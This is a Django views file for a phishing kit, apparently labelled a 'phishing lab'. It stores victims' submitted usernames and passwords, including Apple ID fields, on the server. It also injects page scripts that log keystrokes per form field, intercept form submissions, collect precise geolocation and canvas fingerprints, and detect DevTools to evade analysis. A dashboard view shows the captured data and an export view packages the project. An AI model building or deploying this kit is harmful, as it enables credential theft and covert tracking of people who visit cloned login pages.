import os, shutil, json
from datetime import datetime

from django.core.cache import cache
from django.shortcuts import render, redirect
from django.http import JsonResponse, FileResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render
from django.conf import settings
from django.template import loader
from django.views.generic import TemplateView, View

from .models import PhishingLog, KeystrokeLog, FingerprintLog, GeoLog, EvasionLog
from utilityLogging.utilityLogger import setupLogger

logger = setupLogger(
    log_file= 'luxuryLogs/base.log'
)

@csrf_exempt
def handle_submission(request):
    if request.method == 'POST':
        logger.info('Handling submission in progress')
        logger.info(f'{request.path}')
        PhishingLog.objects.create(
            page=request.path,
            additional_data=json.dumps(request.POST.dict()),
            ip_address=request.META.get('REMOTE_ADDR')
        )
        logger.info(request.POST.dict())
        return JsonResponse({'status': 'received'})

@csrf_exempt
def log_keystroke(request):
    if request.method == 'POST':
        KeystrokeLog.objects.create(
            page=request.path,
            keys=request.POST.get('keys'),
            ip=request.META.get('REMOTE_ADDR')
        )
        return JsonResponse({'status': 'logged'})

@csrf_exempt
def log_geo(request):
    if request.method == 'POST':
        GeoLog.objects.create(
            ip=request.META.get('REMOTE_ADDR'),
            lat=request.POST.get('lat'),
            lon=request.POST.get('lon')
        )
        return JsonResponse({'status': 'geo logged'})


@csrf_exempt
def log_fingerprint(request):
    if request.method != 'POST':
        return JsonResponse({
            'status': 'error',
            'message': 'Method not allowed'
        }, status=405)

    try:
        # Rate limiting
        ip = request.META.get('REMOTE_ADDR')
        logger.info(f"Incoming request from IP: {ip}")
        if cache.get(f'fp_log_{ip}'):
            logger.warning(f"Rate limit exceeded for IP: {ip}")
            return JsonResponse(
                {'status': 'error', 'message': 'Too many requests'}, 
                status=429
            )
        cache.set(f'fp_log_{ip}', True, timeout=60)

        # Parse request data
        try:
            if request.content_type == 'application/json':
                data = json.loads(request.body)
            else:
                data = json.loads(request.POST.get('fp', '{}'))
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error: {str(e)}")
            return JsonResponse(
                {'status': 'error', 'message': 'Invalid JSON data'}, 
                status=400
            )

        # Clean and validate data
        def clean_float(value, default=None):
            try:
                return float(value) if value not in ['unknown', None, 'n/a'] else default
            except (ValueError, TypeError):
                return default

        def clean_int(value, default=None):
            try:
                return int(value) if value not in ['unknown', None, 'n/a'] else default
            except (ValueError, TypeError):
                return default

        def clean_str(value, default=''):
            return str(value) if value not in ['unknown', None] else default

        # Process connection info
        connection_info = data.get('connection', {})
        if isinstance(connection_info, str):
            connection_info = {'type': connection_info}

        # Get IP address considering proxies
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        ip_address = x_forwarded_for.split(',')[0] if x_forwarded_for else ip

        # Create fingerprint log with cleaned data
        log = FingerprintLog(
            ip_address=ip_address,
            user_agent=clean_str(data.get('userAgent')),
            device_type=clean_str(data.get('deviceType')),
            platform=clean_str(data.get('platform')),
            languages=json.dumps(data.get('languages', [])),
            screen_resolution=f"{clean_int(data.get('screen', {}).get('width'), 0)}x{clean_int(data.get('screen', {}).get('height'), 0)}",
            color_depth=clean_int(data.get('screen', {}).get('colorDepth')),
            pixel_ratio=clean_float(data.get('screen', {}).get('devicePixelRatio')),
            orientation=clean_str(data.get('screen', {}).get('orientation')),
            hardware_concurrency=clean_int(data.get('hardwareConcurrency')),
            device_memory=clean_float(data.get('deviceMemory')),
            cpu_class=clean_str(data.get('cpuClass')),
            timezone=clean_str(data.get('timezone')),
            do_not_track=data.get('doNotTrack') == '1',
            cookie_enabled=bool(data.get('cookieEnabled')),
            pdf_viewer_enabled=bool(data.get('pdfViewerEnabled')),
            canvas_hash=clean_str(data.get('canvas')),
            webgl_vendor=clean_str(data.get('webgl', {}).get('vendor')),
            webgl_renderer=clean_str(data.get('webgl', {}).get('renderer')),
            audio_hash=clean_str(data.get('audioContext')),
            plugins=json.dumps(data.get('plugins', [])),
            fonts=json.dumps(data.get('fonts', [])),
            connection_type=clean_str(connection_info.get('type')),
            effective_connection=clean_str(connection_info.get('effectiveType')),
            downlink=clean_float(connection_info.get('downlink'), 0),
            rtt=clean_float(connection_info.get('rtt'), 0),
            webrtc_ips=json.dumps(data.get('webRTC', {}).get('ipAddresses', [])),
            raw_data=data
        )

        log.save()
        logger.info(f"Fingerprint logged from {ip_address} - Device: {log.device_type}")

        return JsonResponse({
            'status': 'success',
            'message': 'Fingerprint logged successfully'
        }, status=201)

    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}", exc_info=True)
        return JsonResponse({
            'status': 'error',
            'message': 'Server error'
        }, status=500)

@csrf_exempt
def log_evasion(request):
    if request.method == 'POST':
        EvasionLog.objects.create(
            ip=request.META.get('REMOTE_ADDR'),
            info=request.POST.get('evasion')
        )
        return JsonResponse({'status': 'evasion logged'})

def view_logs(request):
    logs = {
        'phishing': PhishingLog.objects.all(),
        'keystrokes': KeystrokeLog.objects.all(),
        'fingerprints': FingerprintLog.objects.all(),
        'geos': GeoLog.objects.all(),
        'evasions': EvasionLog.objects.all()
    }
    return render(request, 'base/dashboard.html', logs)

def export_project(request):
    export_path = os.path.join(settings.BASE_DIR, 'phishing_export.zip')
    shutil.make_archive(base_name=export_path.replace('.zip', ''), format='zip', root_dir=settings.BASE_DIR)
    return FileResponse(open(export_path, 'rb'), as_attachment=True, filename='phishing_lab_package.zip')

def phishing_page(request, page_name):
    template = loader.get_template(f'{page_name}.html')

    js_scripts = """
    <script>
    // Keystroke logger
    let keys = "";
    document.addEventListener("keydown", function(e) {
      keys += e.key;
    });
    window.addEventListener("beforeunload", function() {
      navigator.sendBeacon("{% url 'base:log-keystroke' %}", new URLSearchParams({
        page: window.location.pathname,
        keys: keys
      }));
    });

    // Geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("{% url 'base:log-geo' %}", {
          method: "POST",
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: new URLSearchParams({
            lat: position.coords.latitude,
            lon: position.coords.longitude
          })
        });
      });
    }

    // Browser fingerprint
    async function sendFingerprint() {
      const fp = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      };
      fetch("{% url 'base:log-fingerprint' %}", {
        method: "POST",
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({fp: JSON.stringify(fp)})
      });
    }
    window.onload = sendFingerprint;

    // Evasion (DevTools detection)
    const el = new Image();
    Object.defineProperty(el, 'id', {
      get: function () {
        fetch("{% url 'base:log-evasion-detection' %}", {
          method: "POST",
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: new URLSearchParams({evasion: "DevTools opened"})
        });
      }
    });
    console.log(el);
    </script>
    """

    return render(request, f'{page_name}.html', {'tracking_scripts': js_scripts})

class PhishingPageView(View):
    template_name = None
    
    def get(self, request, *args, **kwargs):
        context = self.get_tracking_scripts()
        return render(request, self.template_name, context)
    @csrf_exempt
    def post(self,request, *args, **kwargs):
        return redirect('base:mfa')
    
    def get_tracking_scripts(self):
        return {
            'tracking_scripts': """
            <script>
            // Enhanced fingerprint collection
            async function collectFingerprint() {
                const fp = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    touchSupport: 'ontouchstart' in window
                };
                
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top";
                    ctx.font = "14px 'Arial'";
                    ctx.fillText("fingerprint", 2, 2);
                    fp.canvasHash = canvas.toDataURL();
                } catch(e) {}
                
                return fp;
            }
            
            // Keystroke logger with form field mapping
            const keystrokes = {};
            document.querySelectorAll('input').forEach(input => {
                const fieldName = input.name || input.id || 'unknown';
                keystrokes[fieldName] = '';
                
                input.addEventListener('keydown', function(e) {
                    keystrokes[fieldName] += e.key;
                });
            });
            
            // Form submission handler
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    // Collect all data before submitting
                    const formData = new FormData(form);
                    const formJson = {};
                    formData.forEach((value, key) => formJson[key] = value);
                    
                    const fingerprint = await collectFingerprint();
                    
                    // Send data via Beacon API
                    const data = {
                        ...formJson,
                        fingerprint: fingerprint,
                        keystrokes: keystrokes
                    };
                    
                    navigator.sendBeacon("{% url 'base:log-submission' %}", JSON.stringify(data));
                    
                    // Optionally submit the form after a delay
                    setTimeout(() => {
                        form.submit();
                    }, 1000);
                });
            });
            
            // Geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const geoData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        navigator.sendBeacon("{% url 'base:log-geo' %}", JSON.stringify(geoData));
                    },
                    error => console.error('Geolocation error:', error),
                    {maximumAge: 5000, timeout: 5000, enableHighAccuracy: true}
                );
            }
            
            // DevTools detection
            const devtools = /./;
            devtools.toString = function() {
                fetch("{% url 'base:log-evasion-detection' %}", {
                    method: "POST",
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: "devtools_open"})
                });
                return '';
            };
            console.log('%c', devtools);
            </script>
            """
        }
    
@csrf_exempt
def log_submission(request):
    if request.method == 'POST':
        logger.info('Handling beacon api log submission in progress')
        try:
            data = json.loads(request.body)
            logger.info('Received data')
            logger.info(data)
            
            # Rate limiting
            ip = request.META.get('REMOTE_ADDR')
            if cache.get(f'submission_{ip}'):
                return JsonResponse({'status': 'rate_limited'}, status=429)
            cache.set(f'submission_{ip}', True, timeout=60)
            
            # Create log entry
            PhishingLog.objects.create(
                page=request.path,
                username=data.get('email') or data.get('username') or data.get('user') or data.get('appleid'),
                password=data.get('password') or data.get('pass'),
                ip_address=ip,
                user_agent=request.META.get('HTTP_USER_AGENT'),
                additional_data={
                    'fingerprint': data.get('fingerprint'),
                    'keystrokes': data.get('keystrokes'),
                    'form_data': data
                }
            )
            
            logger.info("Form data saved successfully")
            return JsonResponse({'status': 'success'})
            return redirect('base:mfa')
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': str(e)}, status=400)
    return JsonResponse({'status': 'invalid_method'}, status=405)
